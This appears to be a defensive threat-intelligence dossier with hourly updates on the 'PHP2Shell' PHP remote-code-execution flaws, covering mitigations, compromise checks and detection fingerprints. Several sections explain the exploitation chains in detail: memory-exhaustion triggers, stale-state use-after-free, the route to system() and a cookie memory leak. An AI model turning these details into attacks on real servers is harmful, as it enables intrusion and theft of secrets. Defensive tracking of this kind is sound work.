# Threat Intel Dossier: "PHP2Shell" — CVE-2026-109618 / CVE-2026-109619

**Compiled:** 2026-10-21 (Europe/London) — situation still developing; patch due 14:00 UTC today.
**Confidence:** High on facts below (primary sources); low on unconfirmed exploit-in-the-wild claims.

---

## 1. Executive Summary

- The PHP security team pre-announced (20 Oct 2026) an **emergency security release for 21 Oct 2026, 14:00 UTC**, addressing **two critical vulnerabilities**.
- Both rated **CVSS v4.0 9.2** officially (watchTowr and a deleted HN post called them **CVSS 10.0**).
- CVEs: **CVE-2026-109618** and **CVE-2026-109619** (reserved; as of 21 Oct ~04:25 UTC no NVD/CVE.org records published yet).
- Nature: **unauthenticated Remote Code Execution (RCE)** — community moniker **"PHP2Shell"**, after an exploit tool name visible in a leaked screenshot.
- Allegedly affects **all PHP versions from PHP 5 onward** (per CERT-EU / watchTowr / BleepingComputer). PHP has not officially confirmed affected versions.
- **Details leaked ahead of embargo** (originally scheduled disclosure was Thu 22 Oct 11:00 ET per watchTowr; PHP moved it up). No vendor-confirmed in-the-wild exploitation as of last reports, but PoC/demo video circulating on X/Twitter and a PoC reportedly shared privately.
- Bugs are believed to be in **PHP's multipart/form-data request parsing and the session upload-progress feature** — code that runs **before any application code** (WordPress, Laravel, etc.), so apps with no upload forms are still exposed.

## 2. Key Technical Intel

| Item | Detail | Source/Confidence |
|---|---|---|
| CVE IDs | CVE-2026-109618, CVE-2026-109619 | watchTowr, BleepingComputer — High |
| Severity | 9.2 CVSS v4.0 (official) / 10.0 (watchTowr claim) | High |
| Class | Pre-auth RCE, multipart parsing / upload-progress | Sansec, HN analysis — Medium |
| Affected | PHP 5+ (5/6/7/8); no fix for ≤8.1 (EOL) | watchTowr/CERT-EU — Medium |
| Fix due | 21 Oct 2026 14:00 UTC (may slip earlier) | php.net — Confirmed |
| PoC | Demo video circulating on X; Python-based PoC shared privately; executes arbitrary shell commands (e.g., writes "pwned" to webroot). PoC reportedly requires a known binary path (custom builds may be safe); **may not require authentication**. | HN thread — Medium |
| In-the-wild exploitation | **Not confirmed** by watchTowr/Huntress as of 21 Oct; unverified claims on HN/X | Medium-High (negative) |
| Exploit name | "PHP2Shell" (Sansec); "php2shell" tags; "kindware/benevolent worm" jokes only | Medium |

### Attack surface notes
- Trigger via **multipart/form-data requests**; PHP parses these **before** application logic.
- `session.upload_progress` (on by default) implicated — upload progress data stored in session.
- PHP 8.4+ `request_parse_body()` also parses multipart on **other HTTP methods (PUT/PATCH)** — don't only block POST.
- Things that do **NOT** help: Laravel maintenance mode/CSRF, WordPress security plugins (incl. Wordfence — loads via `auto_prepend_file` too late), `file_uploads=Off`, `post_max_size` limits, `disable_functions`, app-level auth middleware.
- WAFs only help if the origin server is unreachable directly (block non-CDN IPs too).

## 3. Timeline (all UTC, 2026)

| Time | Event |
|---|---|
| ~15:20, 20 Oct | First public post about the leak on Hacker News (user "petecooper", later deleted) — claimed CVSS 10.0, PHP 5+, disclosure 22 Oct |
| 16:39 | Kevin Beaumont (GossiTheDog) posts about the leak on Mastodon |
| ~16:50 | watchTowr confirms on X: "Information has leaked wrt zero-day embargoed RCE vulns in PHP. We can confirm that they're real." (they say they reproduced CVE-2026-109618) |
| 19:33 | php.announce mailing list notice (Jakub Zelenka / PHP security team) |
| 20:12 | Ars Technica coverage |
| 20:33 | CERT-EU Advisory 2026-018 published |
| 21 Oct, early | Demo video of PoC circulating; Sansec "PHP2Shell" research; Cloudflare ships emergency WAF rules ("Generic Rules - Anomalous Execution") |
| 14:00 (due) | PHP patch release; PHP "reserves right to release earlier" |

## 4. Official Sources

- PHP announcement: https://www.php.net/archive/2026.php#2026-10-20-1
- Mailing list: https://news-web.php.net/php.announce/509
- interns.io thread: https://externals.io/message/132883
- CERT-EU advisory 2026-018: https://cert.europa.eu/publications/security-advisories/2026-018/
- watchTowr FAQ: https://watchtowr.com/intelligence/php-cve-2026-109618-faq/
- Sansec "PHP2Shell": https://sansec.io/research/php2shell
- BleepingComputer: https://www.bleepingcomputer.com/news/security/php-warns-admins-of-two-critical-flaws-emergency-patches-coming-tomorrow/
- Ars Technica: https://arstechnica.com/security/2026/10/php-maintainers-tell-web-devs-to-prepare-themselves-for-critical-security-patches/
- Huntress: https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
- HN megathread (411 comments): https://news.ycombinator.com/item?id=50172041
- PHP core dev (Girgias) on mitigations: https://phpc.social/@Girgias/117476477429221001 — "The only mitigation is patching / upgrading PHP. I sadly know too much."

## 5. POC — Status

- **A working PoC exists** but is being shared privately (not published to GitHub as of this writing). A **demo video** circulated on X showing: paste payload in URL → arbitrary shell command on server → "pwned" file written to webroot and displayed in browser. The PoC is described as a Python script that exploits multipart handling then triggers `system()`-style execution.
- One X post links a claimed PoC/demo: https://x.com/k_firsov/status/2112641845926989944 (video) and a mitigation claim: https://x.com/k_firsov/status/2112718728232329240
- watchTowr independently reproduced CVE-2026-109618 internally.
- Caveats per HN commenters: PoC reportedly requires a known binary path (hardened/custom PHP builds may not be exploitable) — unverified.
- **I have not reproduced or verified any exploit code.** Expect public weaponization shortly after 14:00 UTC patch drop — Sansec predicts mass scanning within ~15 minutes of the advisory.

## 6. Mitigations (stopgaps until patched)

**1. Disable session upload progress** (php.ini; lock with `php_admin_flag` in every FPM pool so `.user.ini` can't re-enable):
```ini
session.upload_progress.enabled = Off
# FPM pool: php_admin_flag[session.upload_progress.enabled] = off
```
**2. Block multipart at the web server** (all methods — PHP 8.4 parses multipart PUT/PATCH too):
```nginx
# http context
map $http_content_type $block_multipart { default 0; "~*multipart" 1; }
# server block
if ($block_multipart) { return 444; }
```
```apache
<If "req('Content-Type') =~ /multipart/i">
    Require all denied
</If>
```
Caddy: `@multipart header_regexp Content-Type (?i)multipart` + `respond @multipart 403` (inside route/handle blocks). Cloudflare rule: `any(lower(http.request.headers["content-type"][*])[*] contains "multipart")`.

**3. Where patching is impossible (EOL PHP ≤8.1):** isolate from the internet or take offline; there will be **no fix** for those branches.

**Core dev guidance:** mitigations are *not* endorsed by PHP; only patching is sufficient.

## 7. Post-patch compromise check (from 20 Oct ~15:00 UTC onward)

- Grep web/PHP-FPM logs for anomalous multipart requests and worker crashes.
- `find /var/www -type f -newermt '2026-10-20 15:00 UTC'`; inspect `.user.ini`, `auto_prepend_file`, cron/systemd/supervisor entries, new SSH keys and admin accounts.
- Hunt for web shells; alert on PHP workers spawning shells.
- If compromised: isolate, preserve logs, rebuild, rotate all secrets readable by the PHP user (.env, DB creds, API keys).
- After patching: restart FPM pools + long-running workers (Horizon, Octane, queue workers); rebuild Docker/FrankenPHP images; verify via distro changelog (backported builds don't change upstream version numbers); check `apt-mark showhold` and stale processes (`ls -l /proc/*/exe | grep 'php.*deleted'`).

## 8. Assessment

- **Likely Log4Shell-class event**: unauthenticated pre-app RCE affecting ~70%+ of web servers (WordPress alone ~43% of sites), with leaked details and PoC hours before patch availability. Community figures compare it to Log4Shell.
- Highest-risk populations: unmaintained LAMP/WordPress on shared/VPS hosting, EOL PHP ≤8.1 (no fix), appliances embedding PHP (EdgeRouter-style admin UIs), staging/admin tools reachable directly by IP.
- Watch for: mass scanning within minutes of patch release, ransomware pre-positioning, mass-defacement campaigns. Treat the 14:00 UTC release as the starting gun for exploitation, not the end.

## 9. UPDATE (21 Oct ~12:45 UTC) — Root cause identified, PoC analyzed

**➡ See `php2shell-intel/TECHNICAL-ANNEX.md` for the full technical analysis and detection rules.**

New developments:
- **Cloudflare observed early exploitation 07:43 UTC** (Dane Knecht); WAF rules deployed to all plans.
- **Public PoC ecosystem**: (a) **Calif.IO "PHP2Shell"** tool — full RCE chain demonstrated on Ubuntu 26.04 / PHP 8.5.4 (Apache prefork+mod_php), `system()` as www-data in 15.1 s, 8-attempt retry envelope, per-distro profiles; (b) **jackalsyn** public bundle (downloaded, hash-verified: `74adf2c4…93f0`) with corrected root cause and reproducer lab.
- **Root cause (source-level)**: pre-RINIT `memory_limit` bailout inside `php_session_rfc1867_callback` (session upload progress, ext/session/session.c) orphans `BG(serialize)`/`BG(unserialize)` contexts → **cross-request heap UAF** on the same worker → forged context → arbitrary zval write / forged `pDestructor` → `zend_call_function("system")`. Floor is **PHP 5.4** (feature introduction), not 5.0.
- **Exposure nuance**: Apache **prefork+mod_php** = full chain; php-fpm/CGI exit on the arm request (DoS only in tested config); lsphp unverified. glibc 2.39 (Ubuntu 26.04) demonstrated; per-build offset profiles mean custom builds are harder targets.
- **Additional config mitigations** (verified as lab controls in the bundle): `memory_limit` ≥ ~4× `post_max_size` (arm becomes impossible), lower `post_max_size`, `session.use_strict_mode=1` (blocks attacker-set session IDs), plus `session.upload_progress.enabled=Off` (closes both paths, session.c:3239).
- **Patched versions due 14:00 UTC**: 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 (Alpine GitLab). Remi repo: no updates today.
- Detection artifacts (request fingerprints, log strings, Sigma example) are in the annex §5. Key discriminator: multipart body containing **both** `name="PHP_SESSION_UPLOAD_PROGRESS"` **and** `name="PHPSESSID"` fields, plus ≥64 KB filenames (`filename="` + 256 KB `N`-runs observed).

## 10. UPDATE (21 Oct, post-14:00 UTC) — OFFICIAL ADVISORY PUBLISHED; analysis confirmed

**Patched versions are out: 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12.** Advisory: php.net/archive/2026.php#2026-10-21-5; GHSA-w8hw-w9fx-j79w (109618), GHSA-6wmf-4rv5-p3rp (109619).

Official root causes — matching our lab receipts precisely:
- **109618 "RCE via OOM corruption"**: OOM `longjmp()` can abort while request memory is partially initialized; *any* failed allocation reaches it (need not be related). Official OOM trigger shapes: **(1) chunked multipart without usable Content-Length**, **(2) header flood inside a multipart part** (part headers cost more memory in PHP than on the wire), **(3) empty file controls (`filename=""`) + deeply nested field names**. mod_php runs request shutdown unconditionally after failed startup → app-independent pre-auth RCE on defaults. FPM exits on startup failure (that exact chain doesn't survive); post-startup FPM exposure unproven.
- **109619 "RCE via stale global state"**: worker-global state (error/session/object/extension) survives request-heap free. **Producer**: any request dying before reset (fatal error — 8.5 `fatal_error_backtraces` state cited as basis of the confirmed mod_php exploitation; OOM; max-execution-time; parse/require failure; even nonfatal shutdown diagnostics). **Consumer** on next request, same worker: (a) INI diagnostics raised before request init (incl. via `.htaccess`/`php_value`/`PHP_ADMIN_VALUE`), (b) **session upload progress before normal session init — no `session_start()` needed, default config**.

New official mitigations (beyond our earlier set): `memory_limit=-1` (removes controllable OOM; bound with cgroup, NOT RLIMIT_AS/DATA — those cause the vulnerable allocation failure), `fatal_error_backtraces=0` (8.5), strip `PHP_VALUE`/`PHP_ADMIN_VALUE` from FPM frontend params, remove invalid/deprecated per-request INI settings, fix attacker-reachable fatals/timeouts. Full mitigation = patch only.

**Our lab's A/B result on patched 8.5.12 (source-built, identical harness): the kill sequence (arm → 150-fire → 250-fire) no longer kills the worker** (0/3, vs 12/12 zombie workers on 8.5.4) — consistent with the patch moving OOM handling off the longjmp path. The leak-stage boundary analysis and full validation chain are in `php2shell-intel/lab/VALIDATION-REPORT.md` and `php2shell-intel/lab26/`.

Detection package v2 (network/host/filesystem/config layers, incorporating official OOM shapes + our lab-validated artifacts) is being assembled under `php2shell-intel/detections-v2/`.

## 11. UPDATE 2 (21 Oct ~15:15 UTC) — FULL DISCLOSURE: definitive root cause, AI attribution, PoC flood

Three primary write-ups published at patch time, all linked from **www.php2shell.com**:
- **Calif** `calif.io/php2shell.x/` — Ryan Austin; definitive technical root cause + 11 CMS targets confirmed
- **Wiz Research** `wiz.io/blog/php2shell-php-rce` — Sagi Tzadik et al.; 4 distinct bugs + **memory-disclosure primitive** + AI attribution
- **OpenAI** (Patch the Planet) + PHP Foundation blog

### 11.1 It was found by AI — and that is the real story
Wiz used **Gemini 4 Argon**, **GPT-5.6 Sol** and their **Wiz Atlas** agent. Calif (with OpenAI's Patch the Planet) used an LLM "companion" plus a distilled **`SKILL.md`** that generalised the bug pattern: *"publish/destroy state → perform fallible work → commit/restore; a non-local fatal during the fallible work skips the commit → surviving consumer trusts false state."* Discovery 2026-08-19; reported to PHP 2026-08-24 (Wiz) and 2026-08-11 (Calif); PoC shared with PHP 2026-08-14. **Vulnerable code predates 2004** (Stefan Esser's original memory-limit RCE) and was re-found by the 2024 OSTIF/Quarkslab audit but not proven exploitable. Eleven days from audit start to first RCE.

### 11.2 Definitive root cause (supersedes earlier working theory)
Not a simple session-UAF. The family is **"state committed before fallible work, fatal skips rollback"**. Four demonstrated instances:

1. **`_zend_hash_str_add_or_update_i` count-before-init** (CVE-2026-109618 class): `nNumUsed++/nNumOfElements++` happen **before** `zend_string_init()` — which can `zend_bailout()` on OOM. The bucket becomes teardown-visible while uninitialised; `zend_array_destroy()` then walks it as live. Reached via ordinary `$_POST`/`$_FILES` registration during `php_request_startup()`. **mod_php runs request shutdown even after startup failure → consumes the stale bucket; FPM exits the worker → not exploitable this way.**
2. **Session upload-progress pre-RINIT** (CVE-2026-109619 class, and our lab's finding): `php_hash_environment()` → `php_session_rfc1867_callback()` → `php_rinit_session(0)` publishes `PS(id)`/`PS(http_session_vars)` **before** `zend_activate_modules()`. A fatal skips multipart-END + session RSHUTDOWN; `php_request_shutdown()` frees the heap while `PG(modules_activated)` is still false. Next request with **multipart but no file part** hits `MULTIPART_EVENT_END` without the FILE_START reset → trusts the dangling `PS(id)`.
3. **Unserializer context** (`BG(unserialize).data`/`level`): fatal inside a live decode skips `php_var_unserialize_destroy()`. Post-startup fatal keeps the FPM worker alive → **this is the FPM path** (application-level: `session_start()`, `session_decode()`, `unserialize()`, WordPress `maybe_unserialize()`). Gives `R:`/`r:` reference-list control **and** a controlled native zval copy via `used_slots` (negative count selects before the dtor array → `ZVAL_COPY_VALUE` to attacker-chosen address).
4. **`EG(last_fatal_error_backtrace)` UAF** + **OPcache cross-worker type confusion** (via `CG(map_ptr_last)` frontier advanced locally before the shared publish; another worker reuses the slot for a different type).

### 11.3 NEW: silent memory disclosure (changes the threat model)
**No RCE required.** The stale `PS(id)` `zend_string` is trusted as live; PHP **URL-encodes the reclaimed heap region into the `PHPSESSID` response cookie**. Unauthenticated, application-agnostic (works with no `session_start()`), steals passwords/tokens/API keys/certs from *other requests on that worker*. This is the **most dangerous and least-detected** mode — no child process, no shell, no crash. See `detections-v2/DETECTION-MEMORY-DISCLOSURE.md`.

**Official OOM trigger shapes** (all stay under `post_max_size`):
1. **Chunked / lengthless multipart** — `post_max_size` is compared to declared `Content-Length`, but not enforced on consumed bytes; also input-decompression filters create the same mismatch.
2. **Part-header flood** — part headers cost far more in PHP than on the wire.
3. **`filename=""` empty file controls + deeply nested field names** — six `$_FILES` metadata entries each, not counted by `max_file_uploads`, nesting multiplies native HashTable/Bucket allocations. Hundreds of records → >128 MiB heap from an <8 MiB body.

### 11.4 Confirmed targets (Calif)
WordPress 7.1.2, Drupal 11.4.3, Joomla 6.1.4, MediaWiki 1.46.2, Roundcube 1.7.4, Magento 2.4.9, phpMyAdmin 5.2.3, Nextcloud 35.0.1, Laravel 13.11, Symfony 8.1, WHMCS — pre-auth RCE. **PHP-FPM RCE confirmed** (contrary to the early pre-patch read that FPM was DoS-only). Wiz demos used `wordpress:latest`, `drupal:latest`, `joomla:latest`.

### 11.5 PoC flood has started (as predicted)
GitHub search `php2shell` → **93 repos within hours** of disclosure. Notable:
- `KarimUD7/RCE-POCKET-POC-for-PHP2SHELL` — pocket PoC + lab materials
- `Bazskillz/php2shell_PoC` — "GLM 5.3's vibed PoC"
- `mnk-works/php2shell-verify` — independent verification lab + PoCs
- `Opathedane/php2shell` — standalone assessment toolkit (Go)
- `0-draft/php2shell-anatomy`, `plob881/php2shell-shield`, `orbitron-ai/php2shell-response-kit`, `1o-ya/php-cve-2026-109618-hotfix-guide`
- `Amsozzer1/php2shell-repo-audit` (defensive inventory), `HOSTED-POWER/php_uploadprogress_guard` (C guard, 24★)
- `php2shell.site` — **probe/scan service** already running (mass scanning is live)

**Expect**: worm-style mass scanning, copycat "AI found it" PoCs, and exploit-kit integration over the next 24–72h. Dwell risk is highest for EOL PHP (≤8.1) which has **no upstream fix** — though PHP published minimal source backports for 7.4/8.0/8.1 branches.

### 11.6 Revised mitigation priority (per Calif/Wiz)
1. **Patch** (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12) then **restart every worker** — stale state survives without a restart.
2. `memory_limit=-1` + **cgroup v2 `memory.max`** (never `RLIMIT_AS`/`RLIMIT_DATA` — they trigger the vulnerable path).
3. `session.upload_progress.enabled=0`, lower `post_max_size` (< memory budget), `max_input_nesting_level`, `fatal_error_backtraces=0` (8.5), `display_errors=0`.
4. **Lower `pm.max_requests`** to reduce cross-request state persistence (new, from Wiz).
5. SELinux/AppArmor to constrain worker capability.
6. Detection: the **PHPSESSID response-cookie anomaly** is the highest-fidelity signal for the silent path; the producer→consumer log pair for the RCE paths.

## 12. HOURLY WATCH UPDATE — 2026-10-21 15:54 UTC

Monitoring is live (`php2shell-intel/monitor/`, hourly). Three escalation triggers fired
in the first hour after baseline.

### 12.1 PoC capability is maturing faster than expected
- GitHub `php2shell` repos: **106 → 142 (+36 in one hour)**
- **`9bie/php2shell-bypass-aslr-exp`: 25★ → 63★** — public ASLR-bypass work is the
  capability that converts a crash/DoS PoC into reliable RCE. Its traction is the most
  significant single development since the patch.
- `eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC`: 216★ → 286★
- Assessment: **lower the bar for mass exploitation.** Working RCE no longer requires
  the private Calif tool; the open-source reliability gap is closing.

### 12.2 Distro patch coverage is uneven — check your branch
Debian tracker now has records (was `NO_RECORD_YET`):

| Debian release | Package | Status |
|---|---|---|
| **trixie (13)** | `8.4.27-1~deb13u1` | ✅ **fixed** |
| **bookworm (12)** | `8.2.34-1~deb12u1` (security) | ❌ **still vulnerable** |
| forky / sid | `8.4.26-1` | ❌ vulnerable (behind 8.4.27) |

**Debian 12 has no distro backport yet.** Verify per-release before telling anyone
they're covered.

### 12.3 ⚠️ RHEL / Remi users: there is no fix in that repo
**`rpms.remirepo.net` did not publish updates on 21 Oct** — the PHP Foundation said the
volunteer-run repository would not ship that day. Remi packages are extremely common on
RHEL/CentOS/Alma/Rocky. Affected hosts must:
1. switch to their distribution's PHP packages, or
2. build PHP from source, or
3. apply the config mitigations and treat as exposed.

This gap is easy to miss when checking "is my distro patched?" — **verify by package
origin, not just version string.**

### 12.4 Official guidance updated (Sansec rewrite)
- Sansec now states: *"We expect mass exploitation now that the patch and the writeups
  are public"* (replacing the earlier "within 15 minutes" prediction).
- New stopgap step added: **take the store offline or make it read-only.**
- Confirms PHP ≤8.1 gets no official fix.

### 12.5 NVD enrichment
Both CVEs: references **1 → 2**, **SSVC metric (`ssvcV203`) attached** (unscored).
Status still `Received`; CVSS unchanged at 9.2. Not yet `Analyzed`.

### 12.6 Unchanged
- **CISA KEV: still NO** (catalog 1,754) — the key escalation trigger to watch.
- No PHP re-spin: 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 remain current.
- Detection rules need no change: the new activity improves exploit *reliability*, not
  the request shapes our rules key on.

## 13. HOURLY WATCH UPDATE — 2026-10-21 16:55 UTC

### 13.1 NVD has started analysing
Both CVEs moved **`Received` → `Undergoing Analysis`** (score 9.2 unchanged, 2 references,
SSVC metric attached). Expect `Analyzed` with enriched references/CWE, and this is the
usual prelude to KEV evaluation. **KEV still NO** (catalog 1,754).

### 13.2 New authoritative operational resource: NCSC-NL
`github.com/NCSC-NL/php2shell` — TLP:CLEAR, updated 21 Oct 16:00 UTC, explicitly
"not complete and currently being expanded". Contains material we did not have:
- **`detection_mitigation/cpanel/php2shell-mitigate.sh`** — cPanel/EasyApache 4 mitigation
  script. Directly useful for **shared hosting**, where unmaintained PHP concentrates.
- **`software/software_list_*.md`** — A–Z inventory of products with a PHP dependency that
  may be affected. Usable as an **asset-scoping checklist** (compare against your CMDB).
- Links the EU CSIRT consolidated advisory list (ENISA `CNW-2026-04_php`).

### 13.3 Confirmed SAPI list — update to our earlier assessment
CERT-EU/NCSC now state affected SAPIs explicitly: **PHP-FPM, Apache with mod_php,
php-cgi, FrankenPHP and LiteSpeed**. Our earlier dossier described FrankenPHP as
"likely susceptible" and LiteSpeed as "conditional" — treat **all five as affected**.
Highest risk remains **mod_php** (pre-application-code exploitation).

### 13.4 Embedded appliance exposure (previously under-weighted)
NCSC-EU/NCSC-NL emphasise PHP is **embedded in appliances, network devices, management
interfaces and vendor products** where administrators cannot update PHP directly.
Practical implications:
- Asset inventory must include **appliances and vendor products**, not just web servers.
- For those, the only fix is a **vendor firmware update** — track vendor advisories; until
  then, network-isolate management interfaces.
- phpMyAdmin/Nextcloud/Roundcube-class tools are PHP apps that may be deployed as
  appliances or VMs outside normal server patching.

### 13.5 Exploit ecosystem velocity (still accelerating)
- Repos **142 → 166** (+24 in the hour)
- `ikow/php2shell-poc` **457 → 649★**
- **`9bie/php2shell-bypass-aslr-exp` 63 → 101★** — ASLR-bypass work continues to gain
  traction; this remains the most consequential open-source capability trend.
- New entrants: `wakemeiflose/php2shell`, `xuehuolll/php2shell-CVE-2026-109618-109619`

### 13.6 Research expansion
`ikow` README grew **2,998 → 7,110 bytes**, now documenting a labelled **"Chain D —
mod_php"** path and citing **78% of websites / WordPress 43%**. Watchtowr, Huntress and Wiz
pages were all edited (Wiz +5.4 KB since baseline). No contradicting technical claims
identified.

### 13.7 Unchanged
- KEV: **NO**
- No PHP re-spin (8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 current)
- Detection rules: **no change required** — nothing new in request shape or evasion

## 14. HOURLY WATCH UPDATE — 2026-10-21 17:55 UTC

### 14.1 NVD escalated to 9.8 and formalised the weaknesses
Status `Undergoing Analysis → Modified`.

| Source | Framework | Score | Vector highlights |
|---|---|---|---|
| **NIST/NVD (Primary)** | **CVSS v3.1** | **9.8 CRITICAL** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| PHP security team (Secondary) | CVSS v4.0 | 9.2 CRITICAL | `AV:N/AC:H/...` |

**The disagreement matters:** NIST rates **attack complexity LOW**; PHP rates it **HIGH**.
NIST is effectively saying this is easier to exploit than the vendor's own assessment —
consistent with the rapid public weaponisation we're observing. When briefing
stakeholders, quote **"CVSS 9.2 (vendor) / 9.8 (NIST)"** rather than one figure.

**Formal CWE assignments** (from security@php.net) — they corroborate our root-cause work:
- **CWE-416** Use After Free → the cross-request reuse of freed request state
- **CWE-755** Improper Handling of Exceptional Conditions → fatal/OOM paths skipping cleanup
- **CWE-824** Access of Uninitialized Pointer → the count-before-init HashTable bucket
- **CWE-1325** Improperly Controlled Sequential Memory Allocation → the memory-pressure arm

### 14.2 New tool: safe, non-exploit PHP version checking
**`github.com/openai/php2shell-checker`** (140★, OpenAI, Node.js, no dependencies) —
determines a host's PHP version **without sending exploit traffic**:
```
node phpcheck.js "https://example.com"     # remote
node phpcheck.js --local                   # local CLI PHP
```
Exit codes support automation. **Use this for asset inventory/scoping instead of running
PoCs against production.** It answers "which hosts are actually vulnerable?" as a
low-risk, repeatable sweep — the right first step before patching at scale.

### 14.3 References and ecosystem
- NVD references 2 → 3 (added openwall oss-security posts `2026/10/21/6`, `/7` — the
  canonical public advisory archive).
- PoC repos **166 → 181**; `ikow` **649→725★**; `eness` **286→404★**;
  `openai/php2shell-checker` now top-3 by stars.
- `php2shell.com` +25 KB: references the checker, adds "If you cannot upgrade immediately"
  and "Hardening after upgrading" sections.

### 14.4 Unchanged
KEV: **NO** · No PHP re-spin · Detection rules: no change required (no new request shapes
or evasion techniques; the changes are scoring, tooling and ecosystem growth).

## 15. HOURLY WATCH UPDATE — 2026-10-21 18:55 UTC

### 15.1 ⚠️ CORRECTION: FPM is exploitable — "mod_php only" was wrong
Independent research (`ikow/php2shell-poc`) has now **verified an FPM RCE chain**. This
corrects the framing that FPM was DoS-only and only mod_php gave RCE.

**Chain D — mod_php:** OOM corrupts the Zend executor globals (`EG()`); stale state
consumed on the next request → RCE.

**Chain E — FPM (verified ⚡):**
| Stage | What happens |
|---|---|
| **Producer** | A `session_start()` endpoint decodes a very large (~30 MB) session file → OOM inside `php_var_unserialize` → `BG(unserialize).level` stays >0 and session destruction state is left dirty → **the FPM worker survives** |
| **Consumer** | An `upload_progress` request triggers the `rfc1867` handler, which runs **before `PHP_RINIT_FUNCTION(basic)`**, so it reaches that stale `BG(unserialize)` → `__destruct` on stale objects → UAF → RCE |

**Conditions:** a `session_start()` endpoint + a large session file + FPM.
**New log artifact:** `Session object destruction failed` at PHP Request Startup.

**Operational consequence:** FPM is the majority of modern production PHP (Laravel,
Symfony, modern WordPress stacks). **You do not need mod_php to be exposed.** Any estate
where an application calls `session_start()` and an attacker can grow a session is a
candidate. Prioritise accordingly.

### 15.2 Detection gap closed
`Session object destruction failed` was missing from our Sigma rules — now added
(`selection_session_obj_destroy_failed`) to `web_php_fatal_corruption_sequence.yml`.
This is the highest-value rule change since the package was built: it targets the **FPM**
path specifically.

### 15.3 Ecosystem
PoC repos **181 → 196**. `ikow` **725→758★**, `eness` **404→444★**,
**`openai/php2shell-checker` 139→209★ (+70/hr)** — organisations are adopting the safe
version-inventory tool, which is a good sign for defensive adoption. New scanners appearing
(`JoasASantos/php2shell-scanner`, 24★).

### 15.4 Unchanged
KEV **NO** · NVD `Modified`, refs=3, scores 9.8(v3.1)/9.2(v4) · no PHP re-spin ·
Debian status unchanged (trixie fixed, bookworm vulnerable).

## 16. HOURLY WATCH UPDATE — 2026-10-21 19:55 UTC

### 16.1 ⚠️ UNCONFIRMED: report of a *different* PHP vulnerability working on 8.5.12

**Treat as unverified intelligence, not fact.** Surfaced through the oss-security thread on
CVE-2026-109619 (NVD added these two posts as references, taking 109619 from 3→5 refs).

A researcher (`@elise@fedi.katze.sh`) posted:
| UTC | Post |
|---|---|
| 11:27 | *"there's no way this is the same vuln, this is another one"* |
| 11:44 | *"confirmed working on 8.5.10 too"* |
| **14:32** (32 min post-patch) | **"still works on 8.5.12!"** |
| 14:51 | **"and, reported! 3 line PoC, explanation is only a few sentences, surprisingly simple vuln"** |
| later | flippant/joking ("unreporting… and selling it instead") |

Relayed to oss-security by Aaron Rainbolt prefaced **"While not yet fully confirmed"**, and
discussed by Yves-Alexis Perez (Debian security).

**Verification status at time of writing (all checked directly):**
- ❌ **No CVE assigned** — NVD sweep for PHP CVEs published since 14:00 UTC returns only
  109618 and 109619
- ❌ **No PHP advisory and no re-spin** — 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 remain current
- ❌ **No official PHP acknowledgement**
- ⚠️ Single-source, and subsequent posts read as trolling

**Recommended handling:**
1. **Do not over-claim protection.** Say "patched against CVE-2026-109618 and
   CVE-2026-109619", not "patched = safe". This is now a standing caveat in START-HERE.
2. Keep detections running after patching — they key on behaviour (OOM/state corruption
   artifacts) and are not version-specific, so they retain value if a second bug exists.
3. Escalate immediately if a CVE or PHP re-spin appears for a post-8.5.12 bug.

### 16.2 Official wording clarifies FPM exposure (refines §15)
From the PHP security team's oss-security posts:
- **CVE-2026-109618:** RCE *demonstrated* against **Apache mod_php**; FPM is
  *source-analysis susceptible* — **a complete FPM exploit has not been demonstrated**.
- **CVE-2026-109619:** RCE *demonstrated* against **Apache mod_php and PHP-FPM**.

So FPM is officially confirmed exploitable for **109619**, and suspected-but-not-demonstrated
for **109618**. The §15 correction stands with that nuance: **do not deprioritise FPM.**

### 16.3 Ecosystem
PoC repos **196 → 221 (+25)**. `ikow` **758→796★**, `eness` **444→472★**,
`openai/php2shell-checker` **209→252★**. watchtowr, sansec, huntress edited.

### 16.4 Monitor hardening (self-correction)
While investigating, found the hourly script had **lost its new-CVE sweep** in an earlier
rewrite — the exact signal needed to catch a follow-up CVE for this reported second bug.
Fixed: sweep re-added (section 3b), `fetch_retry()` added because NVD throttles ~5 req/30 s
without an API key (cause of earlier silent emptiness), and EPSS now states
`no_scores_yet=TRUE` explicitly rather than emitting nothing.

### 16.5 Unchanged
KEV **NO** · no PHP re-spin · Debian unchanged (trixie fixed, bookworm vulnerable) ·
NVD still `Modified`.

## 17. HOURLY WATCH UPDATE — 2026-10-21 21:55 UTC — second-vulnerability claim de-escalated

### 17.1 ✅ Resolution: the "still works on 8.5.12" report appears unfounded

The hour-5 unconfirmed claim has been substantially resolved. NVD added
`openwall …/2026/10/21/23` as a reference to CVE-2026-109619 (refs 5→6). That post is:

> *"According to a conversation in #security:ubuntu.com Matrix, **Canonical asked php.org
> if the issue mentioned in this Mastodon thread was a real vulnerability or not, and was
> told that it's 'unrelated and not a real issue'**. If someone from the PHP security team
> could reconfirm this here, that would be greatly appreciated."*
> — Aaron Rainbolt, oss-security, 2026-10-21 17:29 UTC

**Assessment:** the reported "different, simpler vulnerability working on 8.5.12" is most
likely **not a real vulnerability**. PHP told Canonical it is *"unrelated and not a real
issue."*

**Remaining caveats (do not overstate the resolution):**
- The statement is **second-hand** (Canonical Matrix chat → relayed to oss-security)
- **No formal reconfirmation from the PHP security team on-list yet** (posts 24–26 on
  21 Oct are unrelated Pillow and Apache Pulsar items)
- The original claim's author was not contradicted publicly, only adjudicated via vendor

**Revised guidance:** patch status is no longer in question — 8.5.12 / 8.4.27 / 8.3.36 /
8.2.35 close these CVEs. Keeping detections running post-patch remains sensible (they are
behaviour-based and cheap), but do **not** warn stakeholders of a known unpatched second
bug. If the PHP team formally reconfirms on oss-security, revisit immediately.

### 17.2 New-CVE sweep working — but produces triage noise
The sweep flagged `CVE-2026-29001`. On inspection this is **unrelated**: TastyIgniter
≤4.4.5 PHP object injection, **authenticated administrators only**, CVSS 8.6 (v4) / 7.2
(v3.1). Correct keyword match, wrong bug. Expect recurring unrelated "PHP" CVEs; triage
takes seconds — confirm the product is PHP core before escalating.

### 17.3 Ecosystem
